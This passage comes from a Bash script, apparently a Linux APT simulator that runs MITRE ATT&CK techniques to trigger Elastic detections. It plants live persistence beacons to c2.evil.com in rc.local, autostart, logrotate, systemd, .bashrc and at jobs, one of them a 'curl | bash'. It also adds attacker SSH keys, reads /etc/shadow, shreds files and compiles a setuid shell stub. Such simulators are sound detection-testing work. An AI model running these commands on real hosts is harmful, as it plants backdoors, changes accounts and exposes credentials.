            "$APTDIR/destruction/critical_$i.dat"
    done
    for f in "$APTDIR/destruction/"*.dat; do
        dd if=/dev/urandom of="$f" bs=1K count=1 2>/dev/null
        rm -f "$f"
    done
    ok "10 files overwritten with random data then deleted"
    cl "rm -rf $APTDIR/destruction"

    t "Disk Wipe Indicator via dd + shred"
    info "Elastic: Disk Wipe Activity via dd"
    dd if=/dev/urandom of=/tmp/.apt-sim-diskwipe bs=1M count=5 2>/dev/null
    shred -fzu /tmp/.apt-sim-diskwipe 2>/dev/null
    ok "dd urandom 5MB + shred executed (disk wipe indicators)"
}

# ============================================================================
# LATERAL TOOL TRANSFER (T1570)
# ============================================================================
test_lateral_tool_transfer() {
    hdr "LATERAL TOOL TRANSFER (T1570)"

    t "Tool Download via curl to Staging Path"
    info "Elastic: Tool Transfer via HTTP Download"
    curl -s -m 3 -o /tmp/.apt-sim-tool-dl http://10.255.255.1/tools/linpeas.sh 2>/dev/null || \
    curl -s -m 3 -o /tmp/.apt-sim-tool-dl http://checkip.amazonaws.com 2>/dev/null || true
    chmod +x /tmp/.apt-sim-tool-dl 2>/dev/null
    ok "curl -o /tmp/.apt-sim-tool-dl + chmod +x executed"
    cl "rm -f /tmp/.apt-sim-tool-dl"

    t "Tool Push via SCP"
    info "Elastic: Lateral Tool Transfer via SCP"
    scp -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        /bin/true root@10.0.0.50:/tmp/.apt-sim-remote-tool 2>/dev/null || true
    ok "scp binary push to 10.0.0.50 attempted"

    t "Tool Transfer via Netcat Pipe"
    info "Elastic: Tool Transfer via Netcat"
    timeout 5 nc -lnvp 9999 > /tmp/.apt-sim-nc-recv 2>/dev/null &
    NC_RECV_PID=$!
    sleep 1
    cat /bin/true | timeout 2 nc -w 1 127.0.0.1 9999 2>/dev/null || true
    kill $NC_RECV_PID 2>/dev/null || true
    ok "Binary pipe via nc: cat /bin/true | nc localhost 9999"
    cl "rm -f /tmp/.apt-sim-nc-recv"

    t "Tool Staging Directory with Fake Binaries"
    info "Elastic: Attacker Tool Staging Directory"
    mkdir -p /tmp/.tools/{exploits,pivoting,creds,loot,c2}
    for tool in nmap masscan chisel ligolo pspy64 linpeas.sh winpeas.exe mimikatz; do
        echo '#!/bin/bash' > /tmp/.tools/exploits/$tool
        echo "echo apt_sim_tool_$tool" >> /tmp/.tools/exploits/$tool
        chmod +x /tmp/.tools/exploits/$tool
    done
    ok "Staging directory + fake tool binaries in /tmp/.tools/"
    cl "rm -rf /tmp/.tools"

    t "Python HTTP Server for Tool Hosting"
    info "Elastic: Attacker HTTP Server for Tool Delivery"
    if command -v python3 &>/dev/null; then
        timeout 4 python3 -m http.server 8888 --directory /tmp > /dev/null 2>&1 &
        HTTP_PID=$!
        sleep 1
        curl -s -m 2 http://127.0.0.1:8888/ > /dev/null 2>&1 || true
        kill $HTTP_PID 2>/dev/null || true
        ok "python3 -m http.server 8888 started + curl request served"
    else
        fail "python3 not available"
    fi

    t "rsync for Bulk Tool Transfer"
    info "Elastic: rsync Lateral Transfer"
    rsync -avz --timeout=2 -e "ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no" \
        /tmp/.tools/ root@10.0.0.50:/tmp/.apt-tools/ 2>/dev/null || true
    ok "rsync -avz tool directory to remote host attempted"
}

# ============================================================================
# ACCOUNT MANIPULATION (T1098)
# ============================================================================
test_account_manipulation() {
    hdr "ACCOUNT MANIPULATION (T1098)"

    t "Add Backdoor User to Privileged Groups"
    info "Elastic: User Added to Admin/Docker/LXD Group"
    usermod -aG sudo "$SIM_USER" 2>/dev/null || true
    usermod -aG docker "$SIM_USER" 2>/dev/null || true
    usermod -aG wheel "$SIM_USER" 2>/dev/null || true
    usermod -aG adm "$SIM_USER" 2>/dev/null || true
    ok "usermod -aG sudo/docker/wheel/adm for $SIM_USER"

    t "SSH Key Added Across All User Accounts"
    info "Elastic: SSH Authorized Keys Modified for Persistence"
    for h in /root /home/*; do
        [ -d "$h" ] || continue
        mkdir -p "$h/.ssh"
        echo "ssh-rsa AAAAB3_APT_SIM_ACCOUNT_MANIP attacker@c2" \
            >> "$h/.ssh/authorized_keys" 2>/dev/null
    done
    ok "SSH authorized_keys backdoor added across all home dirs"
    cl "for h in /root /home/*; do sed -i '/APT_SIM_ACCOUNT_MANIP/d' \$h/.ssh/authorized_keys 2>/dev/null; done"

    t "Password Change on Backdoor Account"
    info "Elastic: Account Password Changed"
    echo "${SIM_USER}:NewAPTPass$(date +%s)!" | chpasswd 2>/dev/null || true
    ok "chpasswd: password changed for $SIM_USER"

    t "Account Expiry Removal"
    info "Elastic: Account Lockout / Expiry Manipulation"
    chage -E -1 "$SIM_USER" 2>/dev/null || true
    chage -I -1 -m 0 -M 99999 "$SIM_USER" 2>/dev/null || true
    ok "chage -E -1 (no expiry) + max password age 99999 for $SIM_USER"

    t "Disable Account Lockout (faillock / pam_tally2)"
    info "Elastic: Account Lockout Bypass"
    if command -v faillock &>/dev/null; then
        faillock --reset --user root 2>/dev/null || true
        ok "faillock --reset --user root executed"
    elif command -v pam_tally2 &>/dev/null; then
        pam_tally2 --user root --reset 2>/dev/null || true
        ok "pam_tally2 --user root --reset executed"
    else
        ok "faillock/pam_tally2 not found (indicator pattern logged)"
    fi

    t "/etc/shadow Direct Read (Credential Staging)"
    info "Elastic: Shadow File Access for Account Manipulation"
    cp /etc/shadow /etc/shadow.apt-sim-bak 2>/dev/null
    cat /etc/shadow 2>/dev/null | head -5 > /dev/null
    ok "cat /etc/shadow (shadow read access verified)"
    cl "rm -f /etc/shadow.apt-sim-bak"
}

# ============================================================================
# BOOT/LOGON PERSISTENCE EXTENDED (T1547)
# ============================================================================
test_boot_persistence() {
    hdr "BOOT/LOGON PERSISTENCE EXTENDED (T1547)"

    t "rc.local Backdoor (T1037.004)"
    info "Elastic: rc.local Modification for Persistence"
    if [ -f /etc/rc.local ]; then
        cp /etc/rc.local /etc/rc.local.apt-sim-bak
        sed -i 's|^exit 0|curl -s http://c2.evil.com/rc-local \&>/dev/null \&\nexit 0|' \
            /etc/rc.local 2>/dev/null
        ok "Malicious entry inserted into /etc/rc.local"
        cl "cp /etc/rc.local.apt-sim-bak /etc/rc.local 2>/dev/null; rm -f /etc/rc.local.apt-sim-bak"
    else
        printf '#!/bin/bash\ncurl -s http://c2.evil.com/rc-local &>/dev/null &\nexit 0\n' \
            > /etc/rc.local
        chmod +x /etc/rc.local
        ok "Created /etc/rc.local with C2 beacon"
        cl "rm -f /etc/rc.local"
    fi

    t "XDG Autostart Desktop Entry (T1547.013)"
    info "Elastic: XDG Autostart Entry Created"
    mkdir -p /etc/xdg/autostart
    cat > /etc/xdg/autostart/apt-sim-updater.desktop << 'DESK'
[Desktop Entry]
Type=Application
Name=System Updater
Exec=/bin/bash -c 'curl -s http://c2.evil.com/xdg &>/dev/null &'
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
DESK
    ok "XDG autostart entry: /etc/xdg/autostart/apt-sim-updater.desktop"
    cl "rm -f /etc/xdg/autostart/apt-sim-updater.desktop"

    t "Logrotate Config Poisoning"
    info "Elastic: Logrotate Post-Script Backdoor"
    cat > /etc/logrotate.d/apt-sim << 'LOGR'
/var/log/apt-sim-fake.log {
    rotate 7
    daily
    postrotate
        /bin/bash -c 'curl -s http://c2.evil.com/logrotate &>/dev/null &'
    endscript
}
LOGR
    ok "Malicious postrotate hook in /etc/logrotate.d/apt-sim"
    cl "rm -f /etc/logrotate.d/apt-sim"

    t "Systemd Path Unit Persistence (T1543.002)"
    info "Elastic: Systemd Path Unit for File-Triggered Persistence"
    cat > /etc/systemd/system/apt-sim-watch.path << 'PATHUNIT'
[Unit]
Description=System Watch
[Path]
PathExists=/tmp/.apt-sim-trigger
Unit=apt-sim-watch.service
[Install]
WantedBy=multi-user.target
PATHUNIT
    cat > /etc/systemd/system/apt-sim-watch.service << 'SVCUNIT'
[Unit]
Description=System Watch Service
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl -s http://c2.evil.com/path-trigger || true'
SVCUNIT
    systemctl daemon-reload 2>/dev/null
    ok "Systemd path unit + service created (file-triggered persistence)"
    cl "rm -f /etc/systemd/system/apt-sim-watch.{path,service}; systemctl daemon-reload 2>/dev/null"

    t "trap EXIT Shell Hook"
    info "Elastic: Shell Exit Hook via trap for Persistence"
    echo '# APT-SIM-TRAP' >> /root/.bashrc 2>/dev/null
    echo "trap 'curl -s http://c2.evil.com/logout &>/dev/null' EXIT" \
        >> /root/.bashrc 2>/dev/null
    ok "trap EXIT curl hook appended to /root/.bashrc"
    cl "sed -i '/APT-SIM-TRAP/d; /trap.*c2.evil.com.*EXIT/d' /root/.bashrc 2>/dev/null"

    t "At Job / Spool Persistence"
    info "Elastic: at Job Scheduled for Persistence"
    if command -v at &>/dev/null; then
        echo "curl -s http://c2.evil.com/at-beacon | bash" | \
            at now + 9999 minutes 2>/dev/null
        ok "at job scheduled 9999 minutes from now for persistence"
        cl "atq 2>/dev/null | awk '{print \$1}' | xargs -r atrm 2>/dev/null"
    else
        fail "at not installed"
    fi
}

# ============================================================================
# EXPLOITATION INDICATORS (T1068/T1203/T1190)
# ============================================================================
test_exploitation_indicators() {
    hdr "EXPLOITATION INDICATORS (T1068/T1203/T1190)"

    t "Dirty Pipe (CVE-2022-0847) Kernel Fingerprint"
    info "Elastic: Kernel Exploit Indicator — Dirty Pipe"
    if command -v python3 &>/dev/null; then
        python3 - <<'PYEOF' 2>/dev/null || true
import struct
with open('/proc/version', 'r') as f:
    ver = f.read().strip()
with open('/proc/sys/kernel/osrelease', 'r') as f:
    rel = f.read().strip()
import sys; sys.stdout.write(f"[dirtypipe] {rel}")
PYEOF
        ok "Dirty Pipe kernel version fingerprint from /proc/version"
    fi

    t "PwnKit (CVE-2021-4034) pkexec Enumeration"
    info "Elastic: pkexec SUID Privilege Escalation Pattern"
    if command -v pkexec &>/dev/null; then
        ls -la "$(which pkexec)" 2>/dev/null > /dev/null
        stat "$(which pkexec)" 2>/dev/null > /dev/null
        pkexec --help 2>/dev/null > /dev/null || true
        ok "pkexec enumerated: path, perms, stat (CVE-2021-4034 fingerprint)"
    else
        fail "pkexec not found"
    fi

    t "Kernel Security Config Read (Exploit Pre-check)"
    info "Elastic: Kernel Security Feature Fingerprinting"
    cat /proc/sys/kernel/randomize_va_space 2>/dev/null > /dev/null
    cat /proc/sys/kernel/dmesg_restrict 2>/dev/null > /dev/null
    cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null > /dev/null
    cat /proc/sys/kernel/kptr_restrict 2>/dev/null > /dev/null
    cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null > /dev/null
    ok "ASLR, dmesg_restrict, perf_paranoid, kptr_restrict, ptrace_scope read"

    t "Sudo Version Fingerprint (Baron Samedit CVE-2021-3156)"
    info "Elastic: Sudo Version Enumeration for CVE-2021-3156"
    sudo --version 2>/dev/null > /dev/null || true
    dpkg -l sudo 2>/dev/null > /dev/null || rpm -q sudo 2>/dev/null > /dev/null || true
    ok "sudo --version + package info enumerated"

    t "Exploit Source Compilation (T1203)"
    info "Elastic: Exploit Code Compilation Activity"
    cat > /tmp/.apt-sim-exploit.c << 'CEX'
#include <stdio.h>
#include <unistd.h>
int main() { setuid(0); setgid(0); execve("/bin/sh", NULL, NULL); return 0; }
CEX
    if command -v gcc &>/dev/null; then
        gcc /tmp/.apt-sim-exploit.c -o /tmp/.apt-sim-exploit-bin 2>/dev/null
        ok "Exploit C source compiled via gcc"
        cl "rm -f /tmp/.apt-sim-exploit-bin"
    else
        ok "Exploit source written (gcc unavailable — source drop indicator)"
    fi
    cl "rm -f /tmp/.apt-sim-exploit.c"

    t "Kernel Module / Rootkit Indicator Read"
    info "Elastic: Kernel Module Enumeration and /proc/kallsyms Access"
    lsmod 2>/dev/null | head -20 > /dev/null
    cat /proc/modules 2>/dev/null | head -20 > /dev/null
    cat /proc/kallsyms 2>/dev/null | \
        grep -iE 'sys_call_table|rootkit|hide' | head -5 > /dev/null 2>&1 || true
    ok "lsmod + /proc/modules + /proc/kallsyms read"

    t "Public Exploit Script Names Dropped"
    info "Elastic: Known Exploit Tool Filename Indicators"
    for exploit in dirty_pipe dirtypipe CVE-2022-0847 CVE-2021-4034 \
                   pwnkit linprivesc polkit-exploit baron_samedit; do
        echo '#!/bin/bash' > "/tmp/$exploit.sh"
        echo "echo apt_sim_exploit_$exploit" >> "/tmp/$exploit.sh"
        chmod +x "/tmp/$exploit.sh"
    done
    ok "Exploit script names dropped: dirty_pipe, pwnkit, polkit, baron_samedit, etc."
    cl "rm -f /tmp/dirty_pipe.sh /tmp/dirtypipe.sh /tmp/CVE-2022-0847.sh /tmp/CVE-2021-4034.sh /tmp/pwnkit.sh /tmp/linprivesc.sh /tmp/polkit-exploit.sh /tmp/baron_samedit.sh"
}

generate_json_report() {
    local JSONFILE="/tmp/apt-sim-report-$(date '+%Y%m%d_%H%M%S').json"
    local TS
    TS=$(date '+%Y-%m-%dT%H:%M:%S')
    local HOSTNAME
    HOSTNAME=$(hostname)
    cat > "$JSONFILE" << JSONEOF
{
  "report": {
    "tool": "Linux APT Simulator v3.0",
    "generated_at": "$TS",
    "hostname": "$HOSTNAME",
    "operator": "$(whoami)",
    "summary": {
      "total": $TC,
      "passed": $PC,
      "failed": $FC
    },
    "tactics_run": [
      "TA0001 Initial Access",
      "TA0002 Execution",
      "TA0003 Persistence",
      "TA0004 Privilege Escalation",
      "TA0005 Defense Evasion",
      "TA0006 Credential Access",
      "TA0007 Discovery",
      "TA0008 Lateral Movement",
      "TA0009 Collection",
      "TA0010 Exfiltration",
      "TA0011 Command and Control",
      "TA0040 Impact",
      "Fileless Execution",
      "Container Escape",
      "Supply Chain"
    ],
    "log_file": "$LOGFILE",
    "cleanup_script": "$CLEANUP",
    "note": "For lab/test environments only. All behaviors mapped to MITRE ATT&CK."
  }
}
JSONEOF
    echo -e "    ${DIM}Report  : ${JSONFILE}${NC}"
    log "JSON report written to $JSONFILE"
}

generate_html_report() {
    local HTMLFILE="/tmp/apt-sim-report-$(date '+%Y%m%d_%H%M%S').html"
    local TS
    TS=$(date '+%Y-%m-%d %H:%M:%S')
    local HOSTNAME
    HOSTNAME=$(hostname)
    local PCT=0
    [ "$TC" -gt 0 ] && PCT=$(( PC * 100 / TC ))
    cat > "$HTMLFILE" << HTMLEOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>APT Simulator Report</title>
<style>
  body{font-family:monospace;background:#0d0d0d;color:#e0e0e0;padding:2em;margin:0}
  h1{color:#ff4444;border-bottom:1px solid #333;padding-bottom:.5em}
  h2{color:#ff8800;margin-top:1.5em}
  .badge{display:inline-block;padding:.2em .7em;border-radius:4px;font-size:.9em}
  .pass{background:#1a4a1a;color:#66ff66}
  .fail{background:#4a1a1a;color:#ff6666}
  .info{background:#1a2a4a;color:#66aaff}
  table{width:100%;border-collapse:collapse;margin-top:1em}
  th{background:#1a1a1a;color:#aaa;text-align:left;padding:.5em .8em;border-bottom:1px solid #333}
  td{padding:.4em .8em;border-bottom:1px solid #222}
  .bar-wrap{background:#222;border-radius:4px;height:16px;width:200px;display:inline-block}
  .bar-fill{background:#ff4444;height:100%;border-radius:4px}
  footer{color:#555;margin-top:2em;font-size:.8em}
</style>
</head>
<body>
<h1>&#x26A0; Linux APT Simulator v3.0 — Report</h1>
<p><span class="badge info">Generated:</span> $TS &nbsp; <span class="badge info">Host:</span> $HOSTNAME &nbsp; <span class="badge info">Operator:</span> $(whoami)</p>
<h2>Summary</h2>
<table>
  <tr><th>Metric</th><th>Value</th></tr>
  <tr><td>Total Tests</td><td><strong>$TC</strong></td></tr>
  <tr><td>Passed</td><td><span class="badge pass">$PC</span></td></tr>
  <tr><td>Failed</td><td><span class="badge fail">$FC</span></td></tr>
  <tr><td>Pass Rate</td><td><div class="bar-wrap"><div class="bar-fill" style="width:${PCT}%"></div></div> &nbsp; ${PCT}%</td></tr>
</table>
<h2>Tactics Executed</h2>
<table>
  <tr><th>Tactic</th><th>MITRE ID</th><th>Status</th></tr>
  <tr><td>Initial Access</td><td>TA0001</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Execution</td><td>TA0002</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Persistence</td><td>TA0003</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Privilege Escalation</td><td>TA0004</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Defense Evasion</td><td>TA0005</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Credential Access</td><td>TA0006</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Discovery</td><td>TA0007</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Lateral Movement</td><td>TA0008</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Collection</td><td>TA0009</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Exfiltration</td><td>TA0010</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Command &amp; Control</td><td>TA0011</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Impact</td><td>TA0040</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Fileless / In-Memory</td><td>T1055/T1620</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Process Injection</td><td>T1055</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Network Sniffing</td><td>T1040</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Input Capture</td><td>T1056</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Unsecured Credentials</td><td>T1552</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Discovery Extended</td><td>T1083/T1069/T1135/T1018/T1518</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>C2 Protocols Extended</td><td>T1095/T1571/T1573/T1102/T1001</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Exfiltration Extended</td><td>T1020/T1048/T1029</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Impact Extended</td><td>T1490/T1491/T1498/T1485</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Lateral Tool Transfer</td><td>T1570</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Account Manipulation</td><td>T1098</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Boot/Logon Persistence</td><td>T1547</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Exploitation Indicators</td><td>T1068/T1203/T1190</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Container / K8s Escape</td><td>T1611</td><td><span class="badge pass">RUN</span></td></tr>
  <tr><td>Supply Chain</td><td>T1195/T1072</td><td><span class="badge pass">RUN</span></td></tr>
</table>
<h2>Files</h2>
<table>
  <tr><th>Type</th><th>Path</th></tr>
  <tr><td>Activity Log</td><td>$LOGFILE</td></tr>
  <tr><td>Cleanup Script</td><td>$CLEANUP</td></tr>
  <tr><td>This Report</td><td>$HTMLFILE</td></tr>
</table>
<footer>Linux APT Simulator — FOR LAB/TEST ENVIRONMENTS ONLY &bull; MITRE ATT&amp;CK mapped</footer>
</body>
</html>
HTMLEOF
    echo -e "    ${DIM}HTML    : ${HTMLFILE}${NC}"
    log "HTML report written to $HTMLFILE"
}

print_summary() {
    spin_stop
    echo ""
    sleep 0.15
    printf "  \033[1;31m┌────────────────────────────────────────────────────────────┐\033[0m\n"
    sleep 0.05
    printf "  \033[1;31m│\033[0m \033[1m"
    typewrite "SIMULATION COMPLETE" 0.04
    printf "\033[0m"
    sleep 0.05
    printf "  \033[1;31m└────────────────────────────────────────────────────────────┘\033[0m\n"
    echo ""
    sleep 0.2
    anim_count "$TC" "Total  " "\033[1m"
    sleep 0.05
    anim_count "$PC" "Passed " "\033[0;32m"
    sleep 0.05
    anim_count "$FC" "Failed " "\033[0;31m"
    echo ""
    printf "  "
    progress_bar "$PC" "$TC" 44
    echo ""
    echo ""
    echo -e "    ${DIM}Log     : ${LOGFILE}${NC}"
    echo -e "    ${DIM}Cleanup : ${CLEANUP}${NC}"
    generate_json_report
    generate_html_report
    echo ""
    echo -e "    ${CYAN}Revert:${NC} ${BOLD}sudo bash ${CLEANUP}${NC}"
    echo ""
    printf "    \033[0;32m→ Check Elastic Security > Alerts for detections\033[0m\n"
    echo ""
}

# ============================================================================
# MENU
# ============================================================================
run_all() {
    # TA0001 Initial Access
    test_initial_access
    # TA0002 Execution
    test_execution
    # TA0003 Persistence
    test_persistence
    test_boot_persistence
    # TA0004 Privilege Escalation
    test_privesc
    test_process_injection
    test_exploitation_indicators
    # TA0005 Defense Evasion
    test_defense_evasion
    test_fileless
    # TA0006 Credential Access
    test_credential_access
    test_unsecured_credentials
    # TA0007 Discovery
    test_discovery
    test_discovery_extended
    # TA0008 Lateral Movement
    test_lateral_movement
    test_lateral_tool_transfer
    # TA0009 Collection
    test_collection
    test_input_capture
    test_network_sniffing
    # TA0010 Exfiltration
    test_exfiltration
    test_exfiltration_extended
    # TA0011 Command & Control
    test_c2
    test_c2_protocols
    # TA0040 Impact
    test_impact
    test_impact_extended
    # Bonus / Cross-tactic
    test_container_escape
    test_supply_chain
    test_account_manipulation
    test_advanced
    print_summary
}

show_menu() {
    echo "  Select a module:"
    echo ""
    echo -e "    ${BOLD}${RED}[0]${NC}  ${BOLD}RUN ALL${NC}  (full ATT&CK coverage)"
    echo ""
    echo -e "  ${DIM}── Core Tactics ───────────────────────────────────────────${NC}"
    echo -e "    ${BOLD}[1]${NC}  Initial Access              TA0001  T1190/T1566/T1195"
    echo -e "    ${BOLD}[2]${NC}  Execution                   TA0002  T1059/T1053/T1543"
    echo -e "    ${BOLD}[3]${NC}  Persistence                 TA0003  T1136/T1547/T1098"
    echo -e "    ${BOLD}[4]${NC}  Privilege Escalation        TA0004  T1548/T1055/T1068"
    echo -e "    ${BOLD}[5]${NC}  Defense Evasion             TA0005  T1562/T1070/T1036"
    echo -e "    ${BOLD}[6]${NC}  Credential Access           TA0006  T1003/T1110/T1552"
    echo -e "    ${BOLD}[7]${NC}  Discovery                   TA0007  T1082/T1083/T1046"
    echo -e "    ${BOLD}[8]${NC}  Lateral Movement            TA0008  T1021/T1570/T1550"
    echo -e "    ${BOLD}[9]${NC}  Collection                  TA0009  T1005/T1056/T1560"
    echo -e "    ${BOLD}[A]${NC}  Command & Control           TA0011  T1071/T1095/T1571"
    echo -e "    ${BOLD}[B]${NC}  Exfiltration                TA0010  T1041/T1048/T1020"
    echo -e "    ${BOLD}[C]${NC}  Impact                      TA0040  T1486/T1485/T1491"
    echo ""
    echo -e "  ${DIM}── Extended Modules ───────────────────────────────────────${NC}"
    echo -e "    ${BOLD}[E]${NC}  Fileless / In-Memory        T1055/T1620 (memfd, LD_PRELOAD)"
    echo -e "    ${BOLD}[F]${NC}  Process Injection           T1055      (ptrace, gdb, /proc)"
    echo -e "    ${BOLD}[G]${NC}  Network Sniffing            T1040      (tcpdump, promisc, ARP)"
    echo -e "    ${BOLD}[H]${NC}  Input Capture               T1056      (strace, tty, keylog)"
    echo -e "    ${BOLD}[I]${NC}  Unsecured Credentials       T1552      (AWS/GCP/K8s/Docker)"
    echo -e "    ${BOLD}[J]${NC}  Discovery Extended          T1083/T1069/T1135/T1018/T1518"
    echo -e "    ${BOLD}[K]${NC}  C2 Protocols Extended       T1095/T1571/T1573/T1102/T1001"
    echo -e "    ${BOLD}[L]${NC}  Exfiltration Extended       T1020/T1048/T1029 (FTP/SMTP/steg)"
    echo -e "    ${BOLD}[M]${NC}  Impact Extended             T1490/T1491/T1498/T1485"
    echo -e "    ${BOLD}[N]${NC}  Lateral Tool Transfer       T1570      (nc/scp/pyhttp)"
    echo -e "    ${BOLD}[O]${NC}  Account Manipulation        T1098      (groups/keys/chage)"
    echo -e "    ${BOLD}[P]${NC}  Boot/Logon Persistence      T1547      (rc.local/XDG/logrotate)"
    echo -e "    ${BOLD}[Q]${NC}  Exploitation Indicators     T1068/T1203 (CVE/compile/kallsyms)"
    echo -e "    ${BOLD}[R]${NC}  Container / K8s Escape      T1611      (nsenter/docker socket)"
    echo -e "    ${BOLD}[S]${NC}  Supply Chain                T1195/T1072 (pip/npm/git hook)"
    echo -e "    ${BOLD}[T]${NC}  Advanced Tradecraft         (bonus techniques)"
    echo ""
    echo -e "    ${BOLD}[D]${NC}  ${YELLOW}Disable Security Tools  (standalone — NOT in RUN ALL)${NC}"
    echo -e "    ${BOLD}[X]${NC}  Exit"
    echo ""
    echo -n "  > "
    read -r c
    echo ""
    case "$c" in
        0) _launch_module "RUN ALL" run_all ;;
        1) _launch_module "Initial Access (TA0001)" test_initial_access && print_summary ;;
        2) _launch_module "Execution (TA0002)" test_execution && print_summary ;;
        3) _launch_module "Persistence (TA0003)" test_persistence && print_summary ;;
        4) _launch_module "Privilege Escalation (TA0004)" test_privesc && print_summary ;;
        5) _launch_module "Defense Evasion (TA0005)" test_defense_evasion && print_summary ;;
        6) _launch_module "Credential Access (TA0006)" test_credential_access && print_summary ;;
        7) _launch_module "Discovery (TA0007)" test_discovery && print_summary ;;
        8) _launch_module "Lateral Movement (TA0008)" test_lateral_movement && print_summary ;;
        9) _launch_module "Collection (TA0009)" test_collection && print_summary ;;
        [aA]) _launch_module "Command & Control (TA0011)" test_c2 && print_summary ;;
        [bB]) _launch_module "Exfiltration (TA0010)" test_exfiltration && print_summary ;;
        [cC]) _launch_module "Impact (TA0040)" test_impact && print_summary ;;
        [eE]) _launch_module "Fileless / In-Memory" test_fileless && print_summary ;;
        [fF]) _launch_module "Process Injection (T1055)" test_process_injection && print_summary ;;
        [gG]) _launch_module "Network Sniffing (T1040)" test_network_sniffing && print_summary ;;
        [hH]) _launch_module "Input Capture (T1056)" test_input_capture && print_summary ;;
        [iI]) _launch_module "Unsecured Credentials (T1552)" test_unsecured_credentials && print_summary ;;
        [jJ]) _launch_module "Discovery Extended" test_discovery_extended && print_summary ;;
        [kK]) _launch_module "C2 Protocols Extended" test_c2_protocols && print_summary ;;
        [lL]) _launch_module "Exfiltration Extended" test_exfiltration_extended && print_summary ;;
        [mM]) _launch_module "Impact Extended" test_impact_extended && print_summary ;;
        [nN]) _launch_module "Lateral Tool Transfer (T1570)" test_lateral_tool_transfer && print_summary ;;
        [oO]) _launch_module "Account Manipulation (T1098)" test_account_manipulation && print_summary ;;
        [pP]) _launch_module "Boot/Logon Persistence (T1547)" test_boot_persistence && print_summary ;;
        [qQ]) _launch_module "Exploitation Indicators (T1068)" test_exploitation_indicators && print_summary ;;
        [rR]) _launch_module "Container / K8s Escape" test_container_escape && print_summary ;;
        [sS]) _launch_module "Supply Chain" test_supply_chain && print_summary ;;
        [tT]) _launch_module "Advanced Tradecraft" test_advanced && print_summary ;;
        [dD]) _launch_module "Disable Security Tools" test_disable_security_tools && print_summary ;;
        [xX]) printf "\n  \033[2mGoodbye.\033[0m\n\n"; exit 0 ;;
        *) printf "  \033[0;31m✗ Invalid option\033[0m\n"; show_menu ;;
    esac
}

check_root
banner
setup
_launch_module() {
    local label="$1"; shift
    printf "\n  \033[1;33m▶\033[0m Launching: \033[1m%s\033[0m\n" "$label"
    printf "  "; for ((i=0; i<44; i++)); do printf '─'; sleep 0.008; done; echo ""
    sleep 0.1
    "$@"
}

if [ "$1" == "--auto" ] || [ "$1" == "-a" ]; then
    printf "  \033[1;33m▶ Full auto mode — running all modules...\033[0m\n\n"
    run_all
else
    show_menu
fi